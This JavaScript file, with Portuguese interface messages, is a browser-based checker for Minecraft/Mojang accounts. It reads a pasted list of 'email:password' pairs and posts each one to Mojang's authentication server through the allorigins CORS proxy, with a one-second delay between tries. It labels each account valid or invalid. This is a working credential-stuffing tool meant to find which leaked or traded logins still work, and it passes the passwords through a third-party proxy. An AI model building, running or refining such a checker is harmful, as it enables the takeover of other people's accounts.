document.addEventListener('DOMContentLoaded', () => {
    const verificarBtn = document.getElementById('verificar-btn');
    const pararBtn = document.getElementById('parar-btn');
    const contasInput = document.getElementById('contas-input');
    const resultadoList = document.getElementById('resultado-list');
    const statusDiv = document.getElementById('status');
    
    const PROXY_URL = 'https://api.allorigins.win/raw?url=';
    const MOJANG_AUTH_URL = 'https://authserver.mojang.com/authenticate';
    const CHECK_DELAY = 1000;

    let isChecking = false;

    async function fetchViaProxy(url, options) {
        const proxyRequestUrl = `${PROXY_URL}${encodeURIComponent(url)}`;
        try {
            // Adiciona um timeout para a requisição, para não ficar preso indefinidamente
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 15000); // 15 segundos de timeout

            const response = await fetch(proxyRequestUrl, { ...options, signal: controller.signal });
            clearTimeout(timeoutId);

            return response;
        } catch (error) {
            // Trata erros de rede como "Load failed"
            throw new Error(`Erro de rede ou proxy indisponível.`);
        }
    }

    async function autenticarConta(email, senha) {
        const payload = {
            agent: { name: "Minecraft", version: 1 },
            username: email,
            password: senha,
            requestUser: true
        };

        try {
            const response = await fetchViaProxy(MOJANG_AUTH_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });
            
            // Se o proxy está sobrecarregado, ele pode retornar 429
            if (response.status === 429) {
                 return { sucesso: false, mensagem: `❌ Falha: O proxy (allorigins) está sobrecarregado. Tente mais tarde.` };
            }

            const text = await response.text();
            let data;
            
            try {
                data = JSON.parse(text);
            } catch {
                // Se a resposta não for JSON, pode ser uma página de erro do proxy ou da Mojang
                return { sucesso: false, mensagem: `❌ Falha: A API retornou uma resposta inesperada (não-JSON).` };
            }

            if (data.selectedProfile) {
                const username = data.selectedProfile.name;
                return { sucesso: true, mensagem: `✅ Conta VÁLIDA: ${username}` };
            } else if (data.error === "ForbiddenOperationException") {
                return { sucesso: false, mensagem: `❌ Falha: Credenciais inválidas (e-mail ou senha incorretos).` };
            } else {
                // **MELHORIA PRINCIPAL:** Mostra a mensagem de erro exata da Mojang
                const mojangError = data.errorMessage || JSON.stringify(data);
                return { sucesso: false, mensagem: `❌ Falha: ${mojangError}` };
            }
        } catch (error) {
            return { sucesso: false, mensagem: `❌ ${error.message}` };
        }
    }
    
    function addResult(message, type) {
        const li = document.createElement('li');
        li.textContent = message;
        li.className = type;
        resultadoList.appendChild(li);
        resultadoList.scrollTop = resultadoList.scrollHeight;
    }

    async function verificarContas() {
        if (isChecking) return;

        const contasText = contasInput.value.trim();
        if (!contasText) {
            alert('Por favor, insira pelo menos uma conta.');
            return;
        }

        const contas = contasText.split('\n')
            .map(line => line.trim())
            .filter(line => line.includes(':'))
            .map(line => line.split(':', 2));

        if (contas.length === 0) {
            alert('Nenhuma conta no formato email:senha foi encontrada.');
            return;
        }

        isChecking = true;
        verificarBtn.disabled = true;
        pararBtn.disabled = false;
        resultadoList.innerHTML = '';
        
        for (let i = 0; i < contas.length; i++) {
            if (!isChecking) {
                statusDiv.textContent = 'Verificação cancelada pelo usuário.';
                break;
            }

            const [email, senha] = contas[i];
            statusDiv.textContent = `Verificando ${i + 1} de ${contas.length}: ${email}...`;
            
            const resultado = await autenticarConta(email, senha);
            
            if (isChecking) {
                addResult(`${email} -> ${resultado.mensagem}`, resultado.sucesso ? 'sucesso' : 'erro');
                await new Promise(resolve => setTimeout(resolve, CHECK_DELAY));
            }
        }
        
        if (isChecking) {
             statusDiv.textContent = 'Verificação concluída!';
        }
        
        isChecking = false;
        verificarBtn.disabled = false;
        pararBtn.disabled = true;
    }

    function pararVerificacao() {
        if (isChecking) {
            isChecking = false;
        }
    }

    verificarBtn.addEventListener('click', verificarContas);
    pararBtn.addEventListener('click', pararVerificacao);
});
